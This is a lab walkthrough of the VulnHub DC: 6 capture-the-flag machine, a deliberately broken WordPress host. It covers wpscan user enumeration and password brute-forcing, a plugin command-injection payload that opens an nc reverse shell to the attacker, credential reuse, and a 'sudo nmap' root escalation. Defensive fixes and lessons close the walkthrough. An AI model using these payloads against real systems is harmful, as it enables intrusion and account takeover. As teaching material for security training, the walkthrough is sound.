# DC: 6 — VulnHub Walkthrough (Beginner to Intermediate)

DC: 6 is the sixth machine in the DCAU "DC" series. It is a purposely broken Debian
machine running **WordPress** on the hostname `wordy`. This lab is a great introduction
to CMS exploitation: enumerate WordPress, crack a weak user password, abuse a vulnerable
plugin for code execution, then climb the privilege ladder through password reuse and a
misconfigured `sudo` rule. This document explains every step as if you are new to hacking.

| Field | Value |
|---|---|
| Machine | DC: 6 |
| Difficulty | Beginner / Intermediate |
| Author | DCAU (http://www.five86.com/dc-6.html) |
| Released | 26 April 2019 |
| VulnHub Entry | https://vulnhub.com/entry/dc-6,315/ |
| Download | https://vulnhub.com/entry/dc-6,315/#download |
| Attacker | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| Target OS | Debian Linux 64-bit (VirtualBox) |

> **Legal note:** Only attack a machine you own or have explicit permission to test.
> This VM is designed to be broken — never point these tools at systems you do not own.

## 0. What you will learn

By the end of this lab you will have practised:

- **Host discovery and port scanning** — finding the target and its services with `nmap`.
- **Content Management System (CMS) enumeration** — using `wpscan` against WordPress.
- **Username enumeration** — listing valid WordPress users.
- **Password cracking** — building a targeted wordlist and brute-forcing the login.
- **Plugin exploitation** — abusing a vulnerable WordPress plugin for command execution.
- **Horizontal privilege escalation** — reusing credentials found on disk.
- **Vertical privilege escalation** — abusing a `sudo` rule on `nmap` via GTFOBins.
- **Blue-team thinking** — why each mistake is dangerous and how to prevent it.

The core idea: WordPress leaks usernames by default, weak passwords fall to a wordlist,
a plugin trusts admin input too much, and one careless `sudo` rule finishes the job.

## 1. Reconnaissance — finding the target

Confirm your attacker IP is `192.168.56.10`.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

Sweep the subnet to find the target.

```bash
nmap -sn 192.168.56.0/24
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00031s latency).
```

The target is `192.168.56.101`. (Addresses vary by build.)

![Ping sweep finding the target host](images/01-nmap-sweep.png)

> **Why it works:** `nmap -sn` sends lightweight probes and reports which addresses are
> alive, so you can discover the target's IP before you scan its ports.

## 2. Enumeration

Scan all ports and detect service versions.

```bash
nmap -sC -sV -p- 192.168.56.101 -oN nmap-full.txt
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 (Debian)
Service Info: OS: Linux
```

SSH on 22 and a web server on 80. (Version numbers vary by build.)

![Full nmap scan of DC-6](images/02-nmap.png)

The site is WordPress and the box calls itself `wordy`. Add a hosts entry so you can use
the name, then confirm the tech.

```bash
echo "192.168.56.101 wordy" | sudo tee -a /etc/hosts
curl -s http://wordy/ | grep -iE "wp-content|generator"
```

```text
<meta name="generator" content="WordPress 5.1.1" />
<link rel='stylesheet' href='http://wordy/wp-content/themes/...' />
```

The site reveals WordPress and a theme listing some author names.

![Browsing the WordPress site](images/03-wordpress.png)

### 2.1 Enumerate WordPress users

`wpscan` automates WordPress reconnaissance. The `-e u` flag enumerates users.

```bash
wpscan --url http://wordy/ -e u --disable-tls-checks
```

```text
[i] User(s) Identified:
[+] admin
[+] mark
[+] graham
[+] sarah
[+] jens
```

Five valid usernames. (The exact list varies slightly by build.)

![wpscan user enumeration](images/04-wpscan-users.png)

> **Why it works:** WordPress exposes author information through REST endpoints and
> author archives. `wpscan` collects these leaks into a clean list of real usernames —
> the first half of a login attack.

### 2.2 Identify the WordPress version and plugins

```bash
wpscan --url http://wordy/ -e ap
```

```text
[+] WordPress version 5.1.1 identified
[+] Plugins: activity-monitor
```

The plugin **Activity Monitor** is installed. Remember this — it becomes our way in.

## 3. Foothold

### 3.1 Build a targeted wordlist and crack the login

The author of this box hinted that the passwords contain the string `k01`. Rather than
throwing all of `rockyou.txt` at the login, filter it first — this is faster and more
reliable.

```bash
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
wc -l passwords.txt
```

```text
1 passwords.txt
```

Brute-force the WordPress login with `wpscan` and the small list.

```bash
wpscan --url http://wordy/ -U mark -P passwords.txt
```

```text
[SUCCESS] - mark / helpdesk01
```

Credentials: **mark : helpdesk01**. (The winning password depends on the wordlist on your
build; `helpdesk01` is the classic answer.)

> **Why it works:** Filtering a huge wordlist down to likely candidates makes each attempt
> cheap. A single successful match reveals a weak, human-guessable password.

### 3.2 Log in and find the vulnerable plugin

Log in at `http://wordy/wp-login.php` with `mark : helpdesk01`. In the dashboard, the
**Activity Monitor** plugin is visible. It lets an administrator "ping" or look up a host
by entering an address — and it passes that input to a shell command unsafely.

Look up a public exploit for the plugin:

```bash
searchsploit activity monitor
```

```text
Activity Monitor 5.0.0 - Cross-Site Request Forgery   | php/webapps/45274.html
```

![Dashboard showing the Activity Monitor plugin](images/05-plugin.png)

> **Why it works:** Plugins are third-party code that often lags behind on security.
> An admin-privileged user (like `mark`) can reach plugin features that execute system
> commands. Any input reaching a shell is command injection waiting to happen.

### 3.3 Command execution and a reverse shell

Start a listener on Kali.

```bash
rlwrap nc -lvnp 9999
```

In the Activity Monitor page, enter a host value that breaks out of the intended command
and calls back to you:

```text
127.0.0.1; nc -e /bin/sh 192.168.56.10 9999
```

```text
listening on [any] 9999 ...
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 44916
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade the dumb shell to a full TTY:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

![Reverse shell as www-data](images/06-reverse-shell.png)

> **Why it works:** The plugin builds a command like `ping <host>` from your input. The
> semicolon `;` ends the intended command and starts a new one — your reverse shell. The
> target connects *out* to you, which slips past inbound firewalls.

## 4. Privilege escalation

### 4.1 Horizontal move: find a password on disk

Look in `mark`'s home directory for leftover notes.

```bash
cat /home/mark/stuff/things-to-do.txt
```

```text
Things to do:
- Set a password for graham
- graham's password is GSo7isUM1D4
```

Credentials: **graham : GSo7isUM1D4**.

```bash
su graham
```

```text
graham@dc-6:/home/www-data$
```

> **Why it works:** People leave passwords in notes, scripts and config files. Reading
> the files a compromised user can access frequently yields another user's credentials —
> this is "horizontal" movement (sideways, not up).

### 4.2 Move to `jens` via a backup script

Check what `graham` is allowed to run as root and as other users.

```bash
sudo -l
```

```text
User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
```

`graham` can run `/home/jens/backups.sh` as the user `jens`. If the script is writable
(permissions vary by build), append a shell command to it, then run the script as `jens`.

```bash
ls -la /home/jens/backups.sh
echo "/bin/bash" >> /home/jens/backups.sh
sudo -u jens /home/jens/backups.sh
```

```text
jens@dc-6:/home/graham$
```

> **Why it works:** `sudo -u jens ...` runs the script with `jens`'s identity. If we can
> change what the script does, we control the commands that run as `jens`. A script you
> are allowed to run is only as safe as its file permissions.

### 4.3 Move to root via `sudo nmap`

Now that we are `jens`, check `jens`'s sudo rights.

```bash
sudo -l
```

```text
User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
```

`nmap` can execute NSE Lua scripts. Running an attacker-supplied script as root lets us
run shell commands. This is the GTFOBins `nmap` technique.

```bash
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

```text
root@dc-6:/home/jens# id
uid=0(root) gid=0(root) groups=0(root)
```

![Root shell via sudo nmap](images/07-root-nmap.png)

> **Why it works:** `sudo` runs `nmap` as root, not our script. But `nmap` loads our Lua
> file with `--script` and executes it inside a root process, where its `os.execute`
> spawns a root shell. Any powerful binary granted via `sudo` can often be repurposed —
> see GTFOBins for hundreds of examples.

### 4.4 Read the flag

```bash
cd /root
ls
cat theflag.txt
```

```text
... the flag contents ...
```

![Root shell and flag](images/08-root-flag.png)

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact | Fix |
|---|---|---|---|---|
| 1 | Username enumeration | WordPress REST/author archives | Real user list for password attacks | Disable user enumeration; restrict REST API author data |
| 2 | Weak passwords | `mark:helpdesk01` | WordPress admin access | Strong password policy; MFA; login rate-limiting |
| 3 | Vulnerable plugin (command injection) | "Activity Monitor" plugin | Remote code execution as `www-data` | Remove unused plugins; keep plugins patched; never pass input to a shell |
| 4 | Plaintext credentials on disk | `/home/mark/stuff/things-to-do.txt` | Account takeover of `graham` | Never store secrets in plaintext; rotate passwords |
| 5 | Writable script run via sudo | `/home/jens/backups.sh` as `jens` | Privilege change to `jens` | Restrict script permissions; audit `sudo` rules |
| 6 | Powerful binary via sudo | `(root) NOPASSWD: /usr/bin/nmap` | Root shell | Never grant sudo to general-purpose tools; use narrow wrappers |

## 6. Defensive lessons (blue team)

- **Harden WordPress.** Disable XML-RPC, block author enumeration, keep core, themes and
  plugins fully patched, and remove plugins you do not use.
- **Enforce real authentication.** Strong unique passwords, MFA, and lockouts after a few
  failed attempts stop wordlist attacks cold.
- **Keep secrets out of files.** Notes, backups and scripts must never hold plaintext
  passwords. Use a secrets manager and rotate on any suspicion of exposure.
- **Audit `sudo` relentlessly.** `sudo -l` output is a roadmap for attackers. Grant only
  the narrowest command necessary, and never general-purpose tools like `nmap`, `find`,
  `vim`, or `bash`.
- **Watch for outbound callbacks.** The reverse shell is the target connecting to you.
  Egress filtering and alerting on unexpected outbound connections catch this stage.
- **Least privilege for the web user.** `www-data` should not be able to read other users'
  home directories or execute privileged tools.

## 7. References

- VulnHub entry — https://vulnhub.com/entry/dc-6,315/
- DCAU series home — http://www.five86.com/dc-6.html
- WPScan documentation — https://github.com/wpscanteam/wpscan
- Activity Monitor plugin exploit (EDB 45274) — https://www.exploit-db.com/exploits/45274
- GTFOBins — `nmap` privilege escalation — https://gtfobins.github.io/gtfobins/nmap/
- OWASP WordPress security — https://owasp.org/www-project-web-security-testing-guide/
- Exploit-DB (general) — https://www.exploit-db.com/
- HackTricks WordPress — https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress

## 8. Screenshot checklist

Capture these as you go so your write-up is verifiable:

- [ ] `images/01-nmap-sweep.png` — ping sweep finding `192.168.56.101`
- [ ] `images/02-nmap.png` — full nmap scan (ports 22 and 80)
- [ ] `images/03-wordpress.png` — the WordPress site on `wordy`
- [ ] `images/04-wpscan-users.png` — `wpscan` user enumeration (admin, mark, graham, sarah, jens)
- [ ] `images/05-plugin.png` — dashboard showing the Activity Monitor plugin
- [ ] `images/06-reverse-shell.png` — `www-data` reverse shell
- [ ] `images/07-root-nmap.png` — root shell via `sudo nmap`
- [ ] `images/08-root-flag.png` — root shell and `theflag.txt` contents
